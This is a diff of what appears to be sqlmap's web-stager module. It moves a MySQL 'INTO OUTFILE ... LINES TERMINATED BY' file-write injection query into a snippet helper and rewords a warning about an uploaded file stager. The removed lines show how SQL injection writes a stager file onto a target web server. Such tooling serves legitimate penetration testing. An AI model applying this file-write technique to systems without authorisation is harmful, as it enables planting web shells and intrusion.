@@ -18,6 +18,7 @@ from lib.core.common import decloakToNamedTemporaryFile
 from lib.core.common import extractRegexResult
 from lib.core.common import getDirs
 from lib.core.common import getDocRoot
+from lib.core.common import getSQLSnippet
 from lib.core.common import ntToPosixSlashes
 from lib.core.common import isTechniqueAvailable
 from lib.core.common import isWindowsDriveLetterPath
@@ -32,6 +33,7 @@ from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
+from lib.core.enums import DBMS
 from lib.core.enums import OS
 from lib.core.enums import PAYLOAD
 from lib.request.connect import Connect as Request
@@ -115,8 +117,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += "LIMIT 1 INTO OUTFILE '%s' " % outFile
-        query += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
         query = agent.prefixQuery(query)
         query = agent.suffixQuery(query)
         payload = agent.payload(newValue=query)
@@ -247,8 +248,8 @@ class Web:
                     continue
 
                 elif "<%" in uplPage or "<?" in uplPage:
-                    warnMsg = "file stager uploaded "
-                    warnMsg += "on '%s' but not dynamically interpreted" % localPath
+                    warnMsg = "file stager uploaded on '%s', " % localPath
+                    warnMsg += "but not dynamically interpreted"
                     logger.warn(warnMsg)
                     continue
 
